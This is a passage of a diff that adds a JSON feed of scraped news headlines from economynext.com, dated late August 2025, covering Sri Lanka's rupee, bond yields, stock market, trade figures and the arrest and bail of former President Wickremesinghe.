+        "title": "Sri Lanka's Companies Act amendment aligns it with global standards: Deloitte",
+        "url": "https://economynext.com/sri-lankas-companies-act-amendment-aligns-it-with-global-standards-deloitte-238553/",
+        "timestamp": "August 28, 2025",
+        "byline": "International standards such as those set by Financial Action Task Force, Asia-Pacific Group on AML",
+        "isoTimestamp": "2025-08-28T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "34dd8b9c63f63c84614722e0cca63499b8c796c4681a5543e3607cec15379684"
+      },
+      {
+        "title": "Sri Lanka speaker endorses Samurdhi, rubber control bills",
+        "url": "https://economynext.com/sri-lanka-speaker-endorses-samurdhi-rubber-control-bills-238570/",
+        "timestamp": "August 28, 2025",
+        "byline": "Samurdhi bill strengthens financial accountability within community-based banks and banking socities",
+        "isoTimestamp": "2025-08-28T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "1357093439b50318971a733c76b80cb7d07829b64e9d4d1d3d7eb7a502acc01a"
+      },
+      {
+        "title": "Sri Lanka's Alliance Finance to raise Rs1.5bn in bond issue",
+        "url": "https://economynext.com/sri-lankas-alliance-finance-to-raise-rs1-5bn-in-bond-issue-238568/",
+        "timestamp": "August 28, 2025",
+        "byline": "10 million bonds will be issued initially, with an option to issue another 5 million",
+        "isoTimestamp": "2025-08-28T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "95cd7f38f16f65da90cca130ea1b68577aac54b3bd4352b50243316ebed8d199"
+      },
+      {
+        "title": "Indian democracy and economic growth plays a pivotal role in world order",
+        "url": "https://economynext.com/indian-democracy-and-economic-growth-plays-a-pivotal-role-in-world-order-238544/",
+        "timestamp": "August 28, 2025",
+        "byline": "Panelists of webinar on ‘India: A Stable Democracy Leading the Global South’ say India in ideal position",
+        "isoTimestamp": "2025-08-28T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "6dcac5972634751e2a437243c3f9fed625331cb82a66435d9310219f114727e7"
+      },
+      {
+        "title": "Sri Lanka working with India, Abu Dhabi and Indonesia to apprehend criminals: Official",
+        "url": "https://economynext.com/sri-lanka-working-with-india-abu-dhabi-and-indonesia-to-apprehend-criminals-official-238535/",
+        "timestamp": "August 28, 2025",
+        "byline": "Underworld operative Kehelbaddara Padme, in particular, proved to be hard to catch, Ravi Seneviratne said.",
+        "isoTimestamp": "2025-08-28T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "21559aea4fa6c17fdc0aab866ee32e3f8603c5a55f5b95d71fa8fa84f61cdb29"
+      },
+      {
+        "title": "Sri Lanka rupee flat against dollar, bond yields quoted higher",
+        "url": "https://economynext.com/sri-lanka-rupee-flat-against-dollar-bond-yields-quoted-higher-238522/",
+        "timestamp": "August 28, 2025",
+        "byline": ".",
+        "isoTimestamp": "2025-08-28T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "566793746c1e1633d2f2a5e9e579450f10e661a9c293ff908095fccef58f63cf"
+      },
+      {
+        "title": "Sri Lanka residential land prices rise 14.4-pct in Colombo in 2025 first half",
+        "url": "https://economynext.com/sri-lanka-residential-land-prices-rise-14-4-pct-in-colombo-in-2025-first-half-238512/",
+        "timestamp": "August 28, 2025",
+        "byline": "Commercial and Industrial land follow",
+        "isoTimestamp": "2025-08-28T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "bf30d2138e14c8929b00c42a9951dae869e71e5173ab27b14950776af8ea0808"
+      },
+      {
+        "title": "Sri Lanka inks deal with China for technical support on fruit value addition",
+        "url": "https://economynext.com/sri-lanka-inks-deal-with-china-for-technical-support-on-fruit-value-addition-238490/",
+        "timestamp": "August 27, 2025",
+        "byline": "The deal aims to increase production, reduce post-harvest losses as well",
+        "isoTimestamp": "2025-08-27T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "e144163e3867a3908636f4e14ed9c4e2afc485eb217251fea0cf43793a290b52"
+      },
+      {
+        "title": "Sri Lanka rupee weaker against dollar, bond yields edge up",
+        "url": "https://economynext.com/sri-lanka-rupee-weaker-against-dollar-bond-yields-edge-up-238486/",
+        "timestamp": "August 27, 2025",
+        "byline": "Dollar depreciated",
+        "isoTimestamp": "2025-08-27T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "acfe872ff4b1170ffc9928c56a4a0ff91e3031ea63fb7d2ca5c88830881acd83"
+      },
+      {
+        "title": "Sri Lanka awards Aditya Birla bid to supply Octane 92 for six months",
+        "url": "https://economynext.com/sri-lanka-awards-aditya-birla-bid-to-supply-octane-92-for-six-months-238488/",
+        "timestamp": "August 27, 2025",
+        "byline": "Aditya Birla was chosen out of eight bids",
+        "isoTimestamp": "2025-08-27T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "b74d78aadd78277c91abc5ddae90dd9601f072ffceabb03b3c26af2d7c888b75"
+      },
+      {
+        "title": "Sri Lanka sells 37-pct less bills than offered",
+        "url": "https://economynext.com/sri-lanka-sells-37-pct-less-bills-than-offered-238481/",
+        "timestamp": "August 27, 2025",
+        "byline": "Sold 51.14 billion rupees of Treasury bills of an offered 82 million",
+        "isoTimestamp": "2025-08-27T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "20750a0c367ccf14487be8b09d51355980e9b2303e06046d624ef354e98080c8"
+      },
+      {
+        "title": "Sri Lanka stocks close up, led by capital goods, financials",
+        "url": "https://economynext.com/sri-lanka-stocks-close-up-led-by-capital-goods-financials-238479/",
+        "timestamp": "August 27, 2025",
+        "byline": "Turnover was 7.8 billion rupees.",
+        "isoTimestamp": "2025-08-27T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "b96a2ed0585c9ef6a4e79ac3171a1ed6b3e20b0aa8462d547ec3b016b3ff0cfd"
+      },
+      {
+        "title": "Sri Lanka's CEB to get stand-by power to cool coal plant during tripping",
+        "url": "https://economynext.com/sri-lankas-ceb-to-get-stand-by-power-to-cool-coal-plant-during-tripping-238474/",
+        "timestamp": "August 27, 2025",
+        "byline": "To prevent outages",
+        "isoTimestamp": "2025-08-27T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "7b14eb0dd1cf49ee5750350fd3ac22f83f24f1e33c5f017f81a54ea7e890a78b"
+      },
+      {
+        "title": "MAGA Engineering wins deal to repair Sri Lanka's Southern Expressway",
+        "url": "https://economynext.com/maga-engineering-wins-deal-to-repair-sri-lankas-southern-expressway-238472/",
+        "timestamp": "August 27, 2025",
+        "byline": "MAGA Engineering (Pvt) Ltd was chosen following national competitive tender",
+        "isoTimestamp": "2025-08-27T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "d0f397a5450101893c7826bec4745839d8ebec4f2d58b94c236206e19a87332e"
+      },
+      {
+        "title": "Sri Lanka rupee steady, stocks up",
+        "url": "https://economynext.com/sri-lanka-rupee-steady-stocks-up-238444/",
+        "timestamp": "August 27, 2025",
+        "byline": "Bond broadly unchanged",
+        "isoTimestamp": "2025-08-27T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "326c32fa6749fd0cfb5a3d2b6fe68b24d0c2702b7cddc2694e9fa00904613ad8"
+      },
+      {
+        "title": "Sri Lanka's central bank settles US$1.1bn in debt to RBI, IMF in year to March",
+        "url": "https://economynext.com/sri-lankas-central-bank-settles-us1-1bn-in-debt-to-rbi-imf-in-year-to-march-238401/",
+        "timestamp": "August 27, 2025",
+        "byline": "Settling of loans with outright purchased dollars allow net foreign assets to improve",
+        "isoTimestamp": "2025-08-27T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "fb3ce95c012b92acd488fba3c65f0362695b0ff216667c7a3443c76c0503ab3e"
+      },
+      {
+        "title": "Sri Lanka former President Wickremesinghe granted bail by court",
+        "url": "https://economynext.com/sri-lanka-former-president-wickremesinghe-granted-bail-by-court-238350/",
+        "timestamp": "August 26, 2025",
+        "byline": ".",
+        "isoTimestamp": "2025-08-26T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "1180c02af078849d7e1054a186168d0957080770956c9e621639bd8a2b9f600e"
+      },
+      {
+        "title": "Sri Lanka rupee flat against dollar, bond yields steady",
+        "url": "https://economynext.com/sri-lanka-rupee-flat-against-dollar-bond-yields-steady-238371/",
+        "timestamp": "August 26, 2025",
+        "byline": "Rupee held steady",
+        "isoTimestamp": "2025-08-26T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "e89b7b404248d6ab3d2549537d4c1b4fe5e5aa1a537ea9f69e9d72f239ebc763"
+      },
+      {
+        "title": "Sri Lanka stocks close up 0.32-pct",
+        "url": "https://economynext.com/sri-lanka-stocks-close-up-0-32-pct-238363/",
+        "timestamp": "August 26, 2025",
+        "byline": "Turnover 5.14 million rupees",
+        "isoTimestamp": "2025-08-26T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "0c3813398a13770ec6ec1780be45861fc2a4fca671f99ee561cf3ff509922be2"
+      },
+      {
+        "title": "Making public policy work for women: Lessons from Sri Lanka’s Covid-19 response",
+        "url": "https://economynext.com/making-public-policy-work-for-women-lessons-from-sri-lankas-covid-19-response-238320/",
+        "timestamp": "August 26, 2025",
+        "byline": "An Institute of Policy Studies of Sri Lanka article discusses gender-responsive policymaking that work for everyone",
+        "isoTimestamp": "2025-08-26T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "d344b68552ec7d771b5f4b098ba154dda705d4c6b40aa5f4e12d4e2f5bb710e8"
+      },
+      {
+        "title": "Sri Lanka former president likely to face bail hearing via Zoom: Prison spokesman",
+        "url": "https://economynext.com/sri-lanka-former-president-likely-to-face-bail-hearing-via-zoom-prison-spokesman-238337/",
+        "timestamp": "August 26, 2025",
+        "byline": "\"The doctors' recommendation is that because he has complications he cannot be produced in court physically,\"",
+        "isoTimestamp": "2025-08-26T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "12f22afb98927e97fd13150c98f95e04f07e3970b10ce3ac1a9266776bb2f9ab"
+      },
+      {
+        "title": "US congressional staff team visits Sri Lanka to 'grow ties'",
+        "url": "https://economynext.com/us-congressional-staff-team-visits-sri-lanka-to-grow-ties-238330/",
+        "timestamp": "August 26, 2025",
+        "byline": "They’ll meet with parliamentarians, civil society, & senior government officials to share ideas",
+        "isoTimestamp": "2025-08-26T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "2cef9ece382fea87fbc50b245ccba46a9255b8ad020471926eab487aae9db90b"
+      },
+      {
+        "title": "US consumer spending slows as tariffs raise inflation: Fitch",
+        "url": "https://economynext.com/us-consumer-spending-slows-as-tariffs-raise-inflation-fitch-238316/",
+        "timestamp": "August 26, 2025",
+        "byline": "America is Sri Lanka's largest export market",
+        "isoTimestamp": "2025-08-26T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "a0a84099c26fc9d19ed395b24373f0a84d9e1c0adeb690925f6c568093ea3a66"
+      },
+      {
+        "title": "Sri Lanka rupee weaker against dollar, bond yields edge up",
+        "url": "https://economynext.com/sri-lanka-rupee-weaker-against-dollar-bond-yields-edge-up-238302/",
+        "timestamp": "August 26, 2025",
+        "byline": "Rs. 82,000 million Treasury bills are to be issued through an auction on Wednesday",
+        "isoTimestamp": "2025-08-26T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "6c5529be9afccfbb74e3b7846fb270d441643b1bdde52f6abfea2a663c26520c"
+      },
+      {
+        "title": "Sri Lanka to stretch main airport night hub peak to cut congestion",
+        "url": "https://economynext.com/sri-lanka-to-stretch-main-airport-night-hub-peak-to-cut-congestion-238285/",
+        "timestamp": "August 26, 2025",
+        "byline": "We are stretching it to about six hours",
+        "isoTimestamp": "2025-08-26T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "1777428428dd2741e17e19f55ed495f2fd578bc4cefe2617b8ae0338ecbfec0e"
+      },
+      {
+        "title": "Doctors to decide Sri Lanka ex-President Wickremesinghe's court appearance",
+        "url": "https://economynext.com/doctors-to-decide-sri-lanka-ex-president-wickremesinghes-court-appearance-238294/",
+        "timestamp": "August 26, 2025",
+        "byline": ".",
+        "isoTimestamp": "2025-08-26T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "64de15d30ff09359d3b317f6e086c27ace709ba2c80b94f30967606735a048d4"
+      },
+      {
+        "title": "Sri Lanka lawyers condemn YouTuber interference in legal proceedings",
+        "url": "https://economynext.com/sri-lanka-lawyers-condemn-youtuber-interference-in-legal-proceedings-238282/",
+        "timestamp": "August 25, 2025",
+        "byline": "Such acts undermine rule of law, and can have potential to impact the public confidence in the administration of justice",
+        "isoTimestamp": "2025-08-25T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "ebe1acb1c6034bf7564810a7fbbf53e67f4ba6503a497c5c42bf50d923046335"
+      },
+      {
+        "title": "Sri Lanka coconut recovers strongly June 2025, topping last year's level",
+        "url": "https://economynext.com/sri-lanka-coconut-recovers-strongly-june-2025-topping-last-years-level-238251/",
+        "timestamp": "August 25, 2025",
+        "byline": "Sri Lanka coconut prices shot up 1in January 2025, due to a lack of nuts",
+        "isoTimestamp": "2025-08-25T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "9529146a02ba6de28eaca68dfcf01653f06101f493638d86a35188d91d2f12f5"
+      },
+      {
+        "title": "Foreign investors sell Sri Lanka rupee bonds for second straight week",
+        "url": "https://economynext.com/foreign-investors-sell-sri-lanka-rupee-bonds-for-second-straight-week-238278/",
+        "timestamp": "August 25, 2025",
+        "byline": "Foreigners have so far bought USD 125 million worth rupee bonds so far this year",
+        "isoTimestamp": "2025-08-25T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "0c0a33fed8d9b175e023eab9633fe451793b9b7c667ab02aa7a9189e74ad6a70"
+      },
+      {
+        "title": "Sri Lanka rupee weaker against dollar, bond yields steady",
+        "url": "https://economynext.com/sri-lanka-rupee-weaker-against-dollar-bond-yields-steady-238267/",
+        "timestamp": "August 25, 2025",
+        "byline": "Rupee depreciated",
+        "isoTimestamp": "2025-08-25T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "13d23e6bf998b2cb954d62c6f3be564654a1ca3599847af437bc4413929ae7ac"
+      },
+      {
+        "title": "Sri Lanka stocks slide 0.36-pct, weighed down by banks",
+        "url": "https://economynext.com/sri-lanka-stocks-slide-0-36-pct-weighed-down-by-banks-238240/",
+        "timestamp": "August 25, 2025",
+        "byline": "Turnover fell to 4.4 billion",
+        "isoTimestamp": "2025-08-25T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "c330cb238a26b53736859e99e34f22e13126813727ffda1afb77230030246c8e"
+      },
+      {
+        "title": "Sri Lanka export board promotes smart agriculture, aquaculture tech",
+        "url": "https://economynext.com/sri-lanka-export-board-promotes-smart-agriculture-aquaculture-tech-238202/",
+        "timestamp": "August 25, 2025",
+        "byline": "Seminar focused on adopting advanced solutions enhance productivity in agricultural and aquaculture sectors",
+        "isoTimestamp": "2025-08-25T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "b95f7fa63a7b4ab1dee09c5678896c22d524d5136f83245af428b29deca9cc86"
+      },
+      {
+        "title": "Sri Lanka services exports rise 3.36-pct in July",
+        "url": "https://economynext.com/sri-lanka-services-exports-rise-3-36-pct-in-july-238241/",
+        "timestamp": "August 25, 2025",
+        "byline": "ICT/BPM exports, financial services fell",
+        "isoTimestamp": "2025-08-25T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "edf6bac391fe610e5d04776560a3607b3c9f15d0a8c556c381a41d1b67aa6d0f"
+      },
+      {
+        "title": "Sri Lanka exports rise 15.37-pct in July, helped by tea, coconut, rubber and apparel",
+        "url": "https://economynext.com/sri-lanka-exports-rise-15-37-pct-in-july-helped-by-tea-coconut-rubber-and-apparel-238231/",
+        "timestamp": "August 25, 2025",
+        "byline": "Merchandise exports for January to June 2025 rose 7.22 percent",
+        "isoTimestamp": "2025-08-25T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "13e91e5af241163d22ef0e4e6fb1d2781594f6f161b98475908f349e4fd7d5ba"
+      },
+      {
+        "title": "EXPLAINER – Sri Lanka’s ex-president Wickremesinghe’s unprecedented arrest",
+        "url": "https://economynext.com/explainer-sri-lankas-ex-president-wickremesinghes-unprecedented-arrest-238212/",
+        "timestamp": "August 25, 2025",
+        "byline": "Wickremesinghe is one of the few long serving politician in Sri Lanka",
+        "isoTimestamp": "2025-08-25T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "bfb956f95da773b0b2521322c9ac64df675b687329750b6cbfd4b29b48394f62"
+      },
+      {
+        "title": "Sri Lanka average coconut prices rise 0.3-pct",
+        "url": "https://economynext.com/sri-lanka-average-coconut-prices-rise-0-3-pct-238200/",
+        "timestamp": "August 25, 2025",
+        "byline": "The average price for 1,000 nuts was 134,068.09 rupees on August 21.",
+        "isoTimestamp": "2025-08-25T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "a1c473510b81e87a8ec8667724efa7e7675ceb17836104a3f470fa6cccd0ec20"
+      },
+      {
+        "title": "CEAT to invest US$171mn in Sri Lanka OHT tyre and track plants",
+        "url": "https://economynext.com/ceat-to-invest-us171mn-in-sri-lanka-oht-tyre-and-track-plants-238195/",
+        "timestamp": "August 25, 2025",
+        "byline": "To sell under Camso brand",
+        "isoTimestamp": "2025-08-25T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "7b4e62c7095aba126006cbac032690532d397b8ed1243de3c51e5274ce8ca4c4"
+      }
+    ]
+  },
+  "newswire": {
+    "success": false,
+    "error": {}
+  }
+}
